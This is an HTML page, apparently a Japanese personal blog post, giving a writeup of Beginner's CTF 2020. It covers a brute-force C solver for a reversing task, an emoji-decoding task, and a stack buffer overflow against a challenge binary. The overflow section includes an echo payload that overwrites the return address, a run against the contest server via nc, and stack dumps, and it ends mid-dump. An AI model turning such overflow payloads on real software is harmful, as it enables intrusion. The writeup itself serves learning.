@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+    <script>
+        MathJax = {
+            tex: {
+                inlineMath: [['$', '$'], ['\\(', '\\)']]
+            }
+        };
+    </script>
+    <script type="text/javascript" id="MathJax-script" async
+        src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+        </script>
+    <style type="text/css">
+        body {
+            font-size: 16px;
+        }
+    </style>
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    <!-- Enable responsiveness on mobile devices-->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+    <title>earlgray283&#x27;s diary - Beginner&#x27;s CTF 2020 Writeup</title>
+
+    
+
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/slideout/1.0.1/slideout.min.js"></script>
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css"
+        integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js"
+        integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx"
+        crossorigin="anonymous"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/mathtex-script-type.min.js"
+        integrity="sha384-zWYbd0NBwgTsgIdFKVprSfTh1mbMPe5Hz1X3yY4Sd1h/K1cQoUe36OGwAGz/PcDy"
+        crossorigin="anonymous"></script>
+    
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js"
+        integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"
+        onload="renderMathInElement(document.body);"></script>
+    
+    
+    
+
+    
+    <link rel="stylesheet" href="https:&#x2F;&#x2F;earlgray283.github.io&#x2F;public&#x2F;site.css">
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css"
+        integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+    
+    
+
+    
+    
+</head>
+
+<body style="background-color: #faebdf;">
+    <div class="container">
+
+        <div id="mobile-navbar" class="mobile-navbar">
+            <div class="mobile-header-logo">
+                <a href="/" class="logo" style="font-size: 18px;">earlgray283&#x27;s diary</a>
+            </div>
+            <div class="mobile-navbar-icon icon-out">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+
+        <nav id="mobile-menu" class="mobile-menu slideout-menu slideout-menu-left">
+            <ul class="mobile-menu-list">
+                
+                <li class="mobile-menu-item">
+                    <a href="https:&#x2F;&#x2F;earlgray283.github.io&#x2F;public">
+                        Home
+                    </a>
+                </li>
+                
+                <li class="mobile-menu-item">
+                    <a href="https:&#x2F;&#x2F;earlgray283.github.io&#x2F;public&#x2F;about">
+                        About
+                    </a>
+                </li>
+                
+                <li class="mobile-menu-item">
+                    <a href="https:&#x2F;&#x2F;earlgray283.github.io&#x2F;public&#x2F;category">
+                        Category
+                    </a>
+                </li>
+                
+            </ul>
+        </nav>
+
+        <header id="header">
+            <div class="logo"><a href="https:&#x2F;&#x2F;earlgray283.github.io&#x2F;public">earlgray283&#x27;s diary</a></div>
+            <nav class="menu">
+                <ul>
+                    
+                    <li>
+                        <a href="https:&#x2F;&#x2F;earlgray283.github.io&#x2F;public">
+                            Home
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a href="https:&#x2F;&#x2F;earlgray283.github.io&#x2F;public&#x2F;about">
+                            About
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a href="https:&#x2F;&#x2F;earlgray283.github.io&#x2F;public&#x2F;category">
+                            Category
+                        </a>
+                    </li>
+                    
+                </ul>
+            </nav>
+        </header>
+
+        <main>
+            <div class="content" id="mobile-panel">
+                
+
+
+<div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content always-active">
+        <nav id="TableOfContents">
+            <ul>
+                
+                <li>
+                    <a href="https://earlgray283.github.io/public/ctf4b/#beginner-s-ctf-2020-nican-jia-sitekimasita" class="toc-link">Beginner&#x27;s CTF 2020 に参加してきました。</a>
+                    
+                </li>
+                
+                <li>
+                    <a href="https://earlgray283.github.io/public/ctf4b/#mask-reversing-62pt" class="toc-link">mask(Reversing, 62pt)</a>
+                    
+                </li>
+                
+                <li>
+                    <a href="https://earlgray283.github.io/public/ctf4b/#emoemoencode-misc-53pt" class="toc-link">emoemoencode(Misc, 53pt)</a>
+                    
+                </li>
+                
+                <li>
+                    <a href="https://earlgray283.github.io/public/ctf4b/#beginner-s-stack-pwn-134pt" class="toc-link">Beginner&#x27;s Stack(Pwn, 134pt)</a>
+                    
+                </li>
+                
+                <li>
+                    <a href="https://earlgray283.github.io/public/ctf4b/#gan-xiang" class="toc-link">感想</a>
+                    
+                </li>
+                
+            </ul>
+        </nav>
+    </div>
+</div>
+
+
+<article class="post">
+    
+    <header class="post__header">
+        <h1 class="post__title">
+            <a href="https:&#x2F;&#x2F;earlgray283.github.io&#x2F;public&#x2F;ctf4b&#x2F;">Beginner&#x27;s CTF 2020 Writeup</a>
+        </h1>
+        <div class="post__meta">
+            <span class="post__time">2020-05-24</span>
+            
+        </div>
+    </header>
+
+    <div class="post-content">
+      <h2 id="beginner-s-ctf-2020-nican-jia-sitekimasita">Beginner's CTF 2020 に参加してきました。</h2>
+<p>　Beginner's CTF に rm -rf /kadai として参加しました。メンバー全員が CTF 初参戦でしたが、217点を獲得し361位となることができたのでまあよかったんじゃないかなと思います。個人的には pwn が解けなかったのが一番悔しいです。Conglaturation! じゃあないんだよな。<br />
+　私は Reversing の mask, Misc の emoemoencode, Pwn の Beginner's Stack に挑戦したのでそれらについて書いていこうかなと思います。</p>
+<br>
+<h2 id="mask-reversing-62pt">mask(Reversing, 62pt)</h2>
+<p>　一番最初に解いた問題です。<br />
+まずは mask のバイナリファイルを落としてファイルの確認をすると ELF ファイルだったのでまあ実行するんだろうなと思って実行したらなにか出てきました(ここまで早口)</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> ./mask
+</span><span style="color:#bf616a;">Usage:</span><span style="color:#c0c5ce;"> ./mask </span><span style="color:#b48ead;">[</span><span style="color:#c0c5ce;">FLAG</span><span style="color:#b48ead;">]
+</span></pre>
+<p>　ということで適当なフラグを入れて見たけど、わからん！ｗ</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> ./mask ctf4b{329}
+</span><span style="color:#bf616a;">Putting</span><span style="color:#c0c5ce;"> on masks...
+</span><span style="color:#bf616a;">atd4</span><span style="color:#c0c5ce;">`</span><span style="color:#bf616a;">q101u
+c</span><span style="color:#c0c5ce;">`b bk#&quot;</span><span style="color:#a3be8c;">)i
+Wrong FLAG. Try again.
+</span></pre>
+<p>　バイナリファイルが与えられたら <code>strings</code> で中身見ろっておじいちゃんが言っていたのを思い出し、確認をしてみました。すると、<code>Putting on masks...</code>の付近になにやら見慣れた文字列が・・・</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> strings mask
+</span><span style="color:#96b5b4;">.
+.
+</span><span style="color:#bf616a;">Putting</span><span style="color:#c0c5ce;"> on masks...
+</span><span style="color:#bf616a;">atd4</span><span style="color:#c0c5ce;">`</span><span style="color:#bf616a;">qdedtUpetepqeUdaaeUeaqau
+c</span><span style="color:#c0c5ce;">`b bk`</span><span style="color:#bf616a;">kj</span><span style="color:#c0c5ce;">`KbababcaKbacaKiacki
+</span><span style="color:#bf616a;">Correct!</span><span style="color:#c0c5ce;"> Submit your FLAG.
+</span><span style="color:#96b5b4;">.
+.
+</span></pre>
+<p>　ふむふむ、つまり変換後の文字列が<code>atd4`qdedtUpetepqeUdaaeUeaqau</code>-&gt;<code>c`b bk`kj`KbababcaKbacaKiacki</code>というように変換されるように入力を与えてあげればいいということですね。<br />
+　ということで、a-z A-Z それぞれがどのように変換されるかを調べ、条件を満たすように全パターン列挙するコードを書きました！競プロで培ってきた†全探索†です。(変数名クッソ雑ですみません・・・)</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">#include</span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">stdio.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include</span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">string.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">() {
+    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*alphabet = &quot;</span><span style="color:#a3be8c;">abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ</span><span style="color:#c0c5ce;">&quot;;
+    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*list1 = &quot;</span><span style="color:#a3be8c;">a`adede`a`adedepqpqtutupqpA@ADEDE@A@ADEDEPQPQTUTUPQP</span><span style="color:#c0c5ce;">&quot;;
+    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*list2 = &quot;</span><span style="color:#a3be8c;">abc`abchijkhijk`abc`abchijABC@ABCHIJKHIJK@ABC@ABCHIJ</span><span style="color:#c0c5ce;">&quot;;
+    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*ans1 = &quot;</span><span style="color:#a3be8c;">atd4`qdedtUpetepqeUdaaeUeaqau</span><span style="color:#c0c5ce;">&quot;;
+    </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*ans2 = &quot;</span><span style="color:#a3be8c;">c`b bk`kj`KbababcaKbacaKiacki</span><span style="color:#c0c5ce;">&quot;;
+    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> ans[</span><span style="color:#d08770;">1000</span><span style="color:#c0c5ce;">];
+    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;i&lt;</span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(ans1);i++)ans[i]=&#39;</span><span style="color:#a3be8c;">.</span><span style="color:#c0c5ce;">&#39;;
+    ans[</span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(ans1)]=&#39;</span><span style="color:#96b5b4;">\0</span><span style="color:#c0c5ce;">&#39;;
+    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;i&lt;</span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(ans1);i++){
+        </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> j=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;j&lt;</span><span style="color:#96b5b4;">strlen</span><span style="color:#c0c5ce;">(list1);j++) {
+            </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(ans1[i]==list1[j]&amp;&amp;ans2[i]==list2[j]){
+                ans[i]=alphabet[j];
+                </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">&gt; </span><span style="color:#d08770;">%s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, ans);
+                </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
+            }
+        }
+    }
+}
+</span></pre>
+<p>これの出力結果を mask の引数に渡すと合ってるよ！って言ってくれました。</p>
+<br>
+<h2 id="emoemoencode-misc-53pt">emoemoencode(Misc, 53pt)</h2>
+<p>　google 先生に聞いても知らないの一点張りだったので自分でなんとかしました。<br />
+文字は数字！と毎日唱えていればそこまで難しくはありません。最終的にどうせ<code>ctf4b{...}</code>って形になるんだろうな～って思いながら🍣を 'c' と考え、あとは文字の足し算引き算を頑張って、すべての絵文字を半角英字に置き換えました。そしたらフラグが出てきたのでニッコリしました。</p>
+<br>
+<h2 id="beginner-s-stack-pwn-134pt">Beginner's Stack(Pwn, 134pt)</h2>
+<p>　この問題をコンテスト中に解くことはできませんでしたが、かなり惜しいところまでいけていたので書くことにします。<br />
+まずはバイナリを落としてから例の作業をして実行ファイルとわかったので実行します。</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> ./chall
+</span><span style="color:#bf616a;">Your</span><span style="color:#c0c5ce;"> goal is to call `</span><span style="color:#bf616a;">win</span><span style="color:#c0c5ce;">` function (located at 0x400861)
+
+   </span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> Address </span><span style="color:#96b5b4;">]           [</span><span style="color:#c0c5ce;"> Stack </span><span style="color:#96b5b4;">]
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fff121f1da0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007f91447cbfc8 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> buf
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fff121f1da8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000400ad0 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fff121f1db0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000400ad0 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fff121f1db8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007f9144806190 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fff121f1dc0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007fff121f1dd0 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> saved rbp (vuln)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fff121f1dc8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x000000000040084e </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> return address (vuln)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fff121f1dd0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000000000 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> saved rbp (main)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fff121f1dd8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007f91446020b3 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> return address (main)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fff121f1de0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007f9144804620 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fff121f1de8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007fff121f1ec8 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+
+Input:
+</span></pre>
+<p>　正直この瞬間にもうすべてが嫌になったのですが、せっかくの ctf だし頑張るぞ精神で死ぬほど頑張りました。えらい。<br />
+　私はまだ pwn を一回もやったことがなかったので、そもそも何をすればいいのかがわかりませんでした。とりあえず<code>objdump -d chall</code>でアセンブラを見てみます。長くなるので書きませんが、win 関数が呼ばれていないことがわかったので、どうにかして呼び出すんだろうなというところまではわかりました。<br />
+　じゃあどうすんのって話なんですが、色々調べていたら <a href="https://gist.github.com/matsubara0507/72dc50c89200a09f7c61">素晴らしい記事</a> を見つけました。この記事の内容と今回の問題でしたいことがほぼ一致していたので、スタックオーバーフローさせてリターンアドレスをいじればいいんだなということがわかりました。具体的には、vuln 関数のリターンアドレスを win 関数のアドレスに書き換えてあげれば良いです。早速スタックオーバーフローとアドレス書き換えを試してみました。</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> echo</span><span style="color:#bf616a;"> -e </span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x61\x08\x40\x00\x00\x00\x00\x00</span><span style="color:#c0c5ce;">&#39; | </span><span style="color:#bf616a;">./chall
+Your</span><span style="color:#c0c5ce;"> goal is to call `</span><span style="color:#bf616a;">win</span><span style="color:#c0c5ce;">` function (located at 0x400861)
+
+   </span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> Address </span><span style="color:#96b5b4;">]           [</span><span style="color:#c0c5ce;"> Stack </span><span style="color:#96b5b4;">]
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a3e0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007f76886e3fc8 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> buf
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a3e8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000400ad0 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a3f0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000400ad0 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a3f8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007f768871e190 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a400 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007ffc3170a410 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> saved rbp (vuln)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a408 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x000000000040084e </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> return address (vuln)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a410 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000000000 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> saved rbp (main)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a418 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007f768851a0b3 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> return address (main)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a420 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007f768871c620 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a428 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007ffc3170a508 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+
+Input:
+   </span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> Address </span><span style="color:#96b5b4;">]           [</span><span style="color:#c0c5ce;"> Stack </span><span style="color:#96b5b4;">]
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a3e0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x4141414141414141 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> buf
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a3e8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x4141414141414141 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a3f0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x4141414141414141 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a3f8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x4141414141414141 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a400 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x4141414141414141 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> saved rbp (vuln)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a408 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000400861 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> return address (vuln)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a410 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x000000000000000a </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> saved rbp (main)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a418 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007f768851a0b3 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> return address (main)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a420 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007f768871c620 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007ffc3170a428 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007ffc3170a508 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+
+Oops!</span><span style="color:#c0c5ce;"> RSP is misaligned!
+</span><span style="color:#bf616a;">Some</span><span style="color:#c0c5ce;"> functions such as `</span><span style="color:#bf616a;">system</span><span style="color:#c0c5ce;">` use `</span><span style="color:#bf616a;">movaps</span><span style="color:#c0c5ce;">` instructions in libc-2.27 and later.
+</span><span style="color:#bf616a;">This</span><span style="color:#c0c5ce;"> instruction fails when RSP is not a multiple of 0x10.
+</span><span style="color:#bf616a;">Find</span><span style="color:#c0c5ce;"> a way to align RSP! You&#39;</span><span style="color:#a3be8c;">re almost there!
+</span></pre>
+<p>　スタックオーバーフローが発生し、リターンアドレスが書き換えられているのがわかりました。しかし、フラグが獲得できなく、奇妙なメッセージが表示されました。libc-2.27 以降では RSP が 0x10 の倍数でないといけないからなんとかして整頓しろとのことです。意味がわからなくて永遠に調べてたんですがさっぱりわかりませんでした。どなたか詳しく解説していただけると幸いです。<br />
+　やけくそになって色々してたら、まさかの Conglaturation! がでました。</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> echo</span><span style="color:#bf616a;"> -e </span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x62\x08\x40\x00\x00\x00\x00\x00</span><span style="color:#c0c5ce;">&#39; | </span><span style="color:#bf616a;">nc</span><span style="color:#c0c5ce;"> bs.quals.beginners.seccon.jp 9001
+</span><span style="color:#bf616a;">Your</span><span style="color:#c0c5ce;"> goal is to call `</span><span style="color:#bf616a;">win</span><span style="color:#c0c5ce;">` function (located at 0x400861)
+
+   </span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> Address </span><span style="color:#96b5b4;">]           [</span><span style="color:#c0c5ce;"> Stack </span><span style="color:#96b5b4;">]
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719b0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007f15575b5fc8 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> buf
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719b8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000400ad0 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719c0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000400ad0 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719c8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007f15575f0190 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719d0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007fffad3719e0 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> saved rbp (vuln)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719d8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x000000000040084e </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> return address (vuln)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719e0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000000000 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> saved rbp (main)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719e8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007f15573ec0b3 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> return address (main)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719f0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007f15575ee620 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719f8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007fffad371ad8 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+
+Input:
+   </span><span style="color:#96b5b4;">[</span><span style="color:#c0c5ce;"> Address </span><span style="color:#96b5b4;">]           [</span><span style="color:#c0c5ce;"> Stack </span><span style="color:#96b5b4;">]
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719b0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x4141414141414141 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> buf
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719b8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x4141414141414141 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719c0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x4141414141414141 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719c8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x4141414141414141 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719d0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x4141414141414141 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> saved rbp (vuln)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719d8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x0000000000400862 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> return address (vuln)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719e0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x000000000000000a </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> saved rbp (main)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719e8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007f15573ec0b3 </span><span style="color:#c0c5ce;">| &lt;-</span><span style="color:#bf616a;">-</span><span style="color:#c0c5ce;"> return address (main)
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719f0 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007f15575ee620 </span><span style="color:#c0c5ce;">|
+                   </span><span style="color:#bf616a;">+--------------------+
+0x00007fffad3719f8 </span><span style="color:#c0c5ce;">| </span><span style="color:#bf616a;">0x00007fffad371ad8 </span><span style="color:#c0c5ce;">|
